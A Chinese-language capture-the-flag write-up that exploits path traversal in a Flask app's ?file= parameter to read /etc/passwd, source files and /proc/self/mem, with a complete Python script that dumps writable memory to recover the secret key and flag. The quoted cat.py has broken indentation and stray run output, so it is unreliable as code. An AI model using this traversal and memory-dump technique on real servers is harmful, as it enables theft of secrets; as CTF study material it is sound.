这道题感觉难度只有2会不会有点低:sob:

首先在界面中点击某种猫会发现http://61.147.171.105:49839/info?file=ForestCat.txt

于是感觉有文件包含漏洞

发现可以读取http://61.147.171.105:49839/info?file=../../../../../../../etc/passwd

可通过bp抓包得知是用python中的flask框架搭建的

可以读取/proc/self/cmdline来确定http://61.147.171.105:49839/info?file=../../../../../../../proc/self/cmdline

b'python\x00app.py\x00' 可以解码

然后可以读取app.py和cat.py

app.py如下：

```python
import os
import uuid
from flask import Flask, request, session, render_template, Markup
from cat import cat

flag = ""
app = Flask(
    __name__,
    static_url_path='/',
    static_folder='static'
)
app.config['SECRET_KEY'] = str(uuid.uuid4()).replace("-", "") + "*abcdefgh"
if os.path.isfile("/flag"):
    flag = cat("/flag")
    os.remove("/flag")


@app.route('/', methods=['GET'])
def index():
    detailtxt = os.listdir('./details/')
    cats_list = []
    for i in detailtxt:
        cats_list.append(i[:i.index('.')])

    return render_template("index.html", cats_list=cats_list, cat=cat)


@app.route('/info', methods=["GET", 'POST'])
def info():
    filename = "./details/" + request.args.get('file', "")
    start = request.args.get('start', "0")
    end = request.args.get('end', "0")
    name = request.args.get('file', "")[:request.args.get('file', "").index('.')]

    return render_template("detail.html", catname=name, info=cat(filename, start, end))


@app.route('/admin', methods=["GET"])
def admin_can_list_root():
    if session.get('admin') == 1:
        return flag
    else:
        session['admin'] = 0
    return "NoNoNo"


if __name__ == '__main__':
    app.run(host='0.0.0.0', debug=False, port=5637)


```

然后发现secret_key是如下形式*abcdefgh

然后又可以读出cat.py

```python
import os, sys, getopt


def cat(filename, start=0, end=0) -> bytes:
    data = b''

    try:
        start = int(start)
    end = int(end)

    except:
    start = 0
    end = 0

    if filename != "" and os.access(filename, os.R_OK):
        f = open(filename, "rb")

    if start >= 0:
        f.seek(start)
    if end >= start and end != 0:
        data = f.read(end - start)

    else:
        data = f.read()

    else:
    data = f.read()

    f.close()

    else:
    data = ("File `%s` not exist or can not be read" % filename).encode()

    return data


if __name__ == '__main__':
    opts, args = getopt.getopt(sys.argv[1:], '-h-f:-s:-e:', ['help', 'file=', 'start=', 'end='])
    fileName = ""
    start = 0
    end = 0

    for opt_name, opt_value in opts:
        if opt_name == '-h' or opt_name == '--help':
            print("[*] Help")
    print("-f --file File name")
    print("-s --start Start position")
    print("-e --end End position")
    print("[*] Example of reading /etc/passwd")
    print("python3 cat.py -f /etc/passwd")
    print("python3 cat.py --file /etc/passwd")
    print("python3 cat.py -f /etc/passwd -s 1")
    print("python3 cat.py -f /etc/passwd -e 5")
    print("python3 cat.py -f /etc/passwd -s 1 -e 5")
    exit()

    elif opt_name == '-f' or opt_name == '--file':
    fileName = opt_value

    elif opt_name == '-s' or opt_name == '--start':
    start = opt_value

    elif opt_name == '-e' or opt_name == '--end':
    end = opt_value

    if fileName != "":
        print(cat(fileName, start, end))

    else:
        print("No file to read")

Process
finished
with exit code 0

```

发现里面可以确定start和end

然后可以读取文件/proc/self/maps来确定可以读取的起始位置和终止位置

然后读取mem获取flag和secret_key但是还不是很会session伪造(下次再学)

最后的解题脚本如下：

```python
import requests
import re
site = "http://61.147.171.105:49839/"
url = "info?file=../../../../../../../proc/self/mem&start=%s&end=%s"
with open('maps.txt', 'r') as f:
    maps = f.readlines()
for m in maps:
    if " rw" not in m:
        continue
    m = m.split(" ")[0]
    start,end = m.split('-')[0], m.split('-')[1]
    start,end = int(start, 16), int(end, 16)
    print(start,end)
    res = requests.get(site + url % (start,end),proxies=None).content
    with open('res/%s.txt'%str(start),'wb') as f:
        f.write(res)
    # secret: uuid*abcdefgh
    secret = re.findall(b"[a-z0-9A-Z]{32}\*abcdefgh",res)
    if secret:
        print(secret)
    # flag:CatCTF{xxxx} asdfsda{
    flag = re.findall(b"[a-zA-Z]{4}\{[a-z0-9A-Z-_]*\}",res)
    if flag:
        print(flag)

```

